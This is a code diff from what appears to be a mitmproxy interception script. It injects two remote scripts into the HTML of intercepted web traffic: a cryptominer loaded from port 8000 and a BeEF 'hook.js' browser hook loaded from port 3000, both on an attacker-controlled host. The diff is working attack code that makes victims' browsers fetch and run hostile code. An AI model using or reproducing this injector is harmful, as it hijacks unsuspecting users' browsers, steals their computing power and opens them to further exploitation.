@@ -12,16 +12,25 @@ class Injector:
         if self.path:
             html = BeautifulSoup(flow.response.content, "html.parser")
             print(self.path)
-            print(flow.response.headers["content-type"])
-            if flow.response.headers["content-type"] == 'text/html':
+            if not 'Content-Type' in flow.response.headers:
+                print("\nNo content type in headers. Get over it.")
+            elif flow.response.headers["content-type"] == 'text/html':
                 print(flow.response.headers["content-type"])
-                script = html.new_tag(
+                miner = html.new_tag(
                     "script",
-                    src=self.path,
+                    src="http://"+self.path+":8000/script.js",
                     type='application/javascript')
-                html.body.insert(0, script)
+                beef = html.new_tag(
+                    "script",
+                    src="http://"+self.path+":3000/hook.js",
+                    type='application/javascript')
+                html.insert(0, miner)
+                html.insert(0, beef)
                 flow.response.content = str(html).encode("utf8")
-                print("Script injected.")
+                print("Scripts injected.")
+            else:
+                print("\nWrong content type. Sorry.")
+                print(str(flow.response.headers['Content-Type']) + "\n\n")
 
 def start():
     parser = argparse.ArgumentParser()
